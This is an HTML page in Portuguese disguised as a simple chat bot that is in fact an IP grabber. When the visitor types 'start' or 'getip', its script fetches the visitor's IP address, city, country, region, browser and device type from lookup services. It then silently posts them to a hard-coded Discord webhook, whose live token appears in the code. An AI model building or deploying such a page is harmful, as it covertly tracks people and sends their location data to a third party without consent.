<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Dados</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .chat-container {
            width: 500px;
            height: 700px;
            background-color: #181818;
            border-radius: 10px;
            display: flex;
            flex-direction: column;
            padding: 20px;
            overflow-y: auto;
        }

        .chat-message {
            background-color: #333;
            color: white;
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 15px;
            max-width: 80%;
        }

        .message-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            height: 100%;
            overflow-y: auto;
        }

        .input-box {
            background-color: #333;
            border: none;
            color: white;
            padding: 10px;
            border-radius: 10px;
            width: 100%;
            margin-top: 20px;
        }

        #loading {
            font-size: 20px;
            text-align: center;
            color: #ff6347;
        }

        .status-bar {
            background-color: #333;
            padding: 10px;
            margin-top: 20px;
            color: #ff6347;
            border-radius: 10px;
            text-align: center;
        }

        .error {
            color: red;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="message-container" id="messages"></div>
        <input type="text" id="input" class="input-box" placeholder="Digite algo...">
        <div id="loading" class="status-bar">Aguardando...</div>
    </div>

    <script>
        const ipApiUrl = 'https://ip-api.com/json/';
        const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3'; // Substitua pelo seu webhook real

        function createMessage(text, sender = 'bot') {
            const messageContainer = document.getElementById('messages');
            const messageElement = document.createElement('div');
            messageElement.classList.add('chat-message');
            messageElement.textContent = text;
            messageContainer.appendChild(messageElement);
            messageContainer.scrollTop = messageContainer.scrollHeight; // Scroll para o final
        }

        // Função para pegar o IP e outras informações do usuário
        function getUserInfo() {
            fetch(ipApiUrl)
                .then(response => response.json())
                .then(data => {
                    const ip = data.query;
                    const city = data.city;
                    const country = data.country;
                    const region = data.regionName;

                    const userAgent = navigator.userAgent;
                    const browser = getBrowser(userAgent);
                    const isMobile = /Mobi|Android/i.test(userAgent);
                    const device = isMobile ? 'Mobile' : 'PC';

                    const ipDetails = `IP: ${ip}\nCidade: ${city}\nPaís: ${country}\nRegião: ${region}`;
                    const browserDetails = `Navegador: ${browser}\nDispositivo: ${device}`;
                    
                    createMessage(ipDetails);
                    createMessage(browserDetails);

                    sendDataToWebhook(ip, browser, device);
                })
                .catch(error => {
                    createMessage("Erro ao obter o IP.", 'error');
                });
        }

        // Função para detectar o navegador
        function getBrowser(userAgent) {
            if (userAgent.indexOf("Chrome") > -1) return 'Chrome';
            if (userAgent.indexOf("Firefox") > -1) return 'Firefox';
            if (userAgent.indexOf("Safari") > -1) return 'Safari';
            if (userAgent.indexOf("Edge") > -1) return 'Edge';
            return 'Desconhecido';
        }

        // Função para enviar os dados para o Discord Webhook
        function sendDataToWebhook(ip, browser, device) {
            const data = {
                content: `
**Informações Coletadas:**

> **IP:** ${ip}
> **Navegador:** ${browser}
> **Dispositivo:** ${device}
            `
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Dados enviados com sucesso!");
                } else {
                    console.error("Erro ao enviar dados.");
                }
            })
            .catch(error => {
                console.error("Erro ao enviar dados:", error);
            });
        }

        // Função para capturar IP de uma API externa (pode ser IP Grabber)
        function captureIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    createMessage(`Capturado IP: ${data.ip}`);
                    sendDataToWebhook(data.ip, "Desconhecido", "Desconhecido");
                })
                .catch(error => {
                    createMessage("Erro ao capturar IP.", 'error');
                });
        }

        // Quando o usuário enviar uma mensagem
        document.getElementById('input').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                const input = document.getElementById('input');
                const userMessage = input.value;
                createMessage(userMessage, 'user');
                input.value = ''; // Limpar o campo de entrada

                // Verificar se o comando é 'start'
                if (userMessage.toLowerCase() === 'start') {
                    createMessage("Iniciando coleta de dados...", 'bot');
                    getUserInfo();
                }
                // Se o comando for 'getip', capturar o IP
                if (userMessage.toLowerCase() === 'getip') {
                    createMessage("Obtendo IP externo...", 'bot');
                    captureIP();
                }
            }
        });

        // Exemplo de inicialização
        createMessage("Olá, sou o bot! Digite 'start' para começar.");
    </script>
</body>
</html>
